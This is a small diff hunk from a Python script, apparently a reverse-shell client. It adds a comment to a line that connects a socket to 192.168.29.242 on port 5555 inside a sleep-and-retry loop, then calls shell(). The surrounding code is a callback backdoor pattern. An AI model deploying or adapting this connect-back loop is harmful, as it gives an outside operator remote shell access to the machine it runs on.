@@ -24,7 +24,7 @@ def connection():
 	while True:
 		time.sleep(20)
 		try:
-			s.connect(('192.168.29.242',5555))
+			s.connect(('192.168.29.242',5555))  # set IP address and port (in this case : 192.168.29.242 , 5555)
 			shell()
 			s.close()
 			break
